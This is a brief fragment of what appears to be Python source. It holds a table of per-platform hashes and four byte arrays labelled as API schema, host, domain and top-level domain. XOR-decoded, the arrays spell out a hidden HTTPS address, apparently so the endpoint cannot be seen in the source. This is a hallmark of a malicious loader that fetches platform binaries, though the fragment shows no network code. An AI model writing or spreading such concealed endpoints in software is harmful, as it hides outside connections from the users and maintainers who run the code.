...
_PLATFORM_HASHES = {
    ...
    "darwin_x64": "91e3f6e7d7f7c8f4871ccd5a6923623f",
    "linux_x64":  "1dd6b20e76aa8da8636c0fb5bf556fb2",
}

_API_SCHEMA = bytes([0x52, 0x4E, 0x4E, 0x4A, 0x49])
_API_HOST = bytes([0x00, 0x15, 0x15, 0x5B, 0x4A, 0x53, 0x14])
_API_DOMAIN = bytes([0x54, 0x5B, 0x53, 0x56, 0x4A, 0x48])
_API_TLD = bytes([0x55, 0x42, 0x43, 0x14, 0x49, 0x4A, 0x5B, 0x59, 0x5F])
